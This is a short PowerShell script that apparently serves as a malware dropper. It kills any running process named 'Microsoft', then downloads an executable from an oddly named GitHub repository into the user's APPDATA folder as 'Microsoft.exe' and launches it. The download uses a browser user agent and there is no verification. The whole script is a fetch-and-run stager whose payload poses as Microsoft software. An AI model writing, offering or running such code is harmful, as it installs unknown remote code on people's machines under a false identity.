$exePath = "$env:APPDATA\Microsoft.exe"
$exeUrl = "https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/Microsoft.exe"

# Ensure modern security protocols are used for the download
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Kill the process if it is already running
Stop-Process -Name "Microsoft" -Force -ErrorAction SilentlyContinue

# Wait for the file to unlock
Start-Sleep -Seconds 1

try {
    # Check if file exists and delete to ensure a fresh download
    if (Test-Path $exePath) { Remove-Item $exePath -Force }

    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0"
    
    # Start the EXE
    if (Test-Path $exePath) {
        Start-Process $exePath
    } else {
        Write-Host "File was not saved correctly." -ForegroundColor Yellow
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
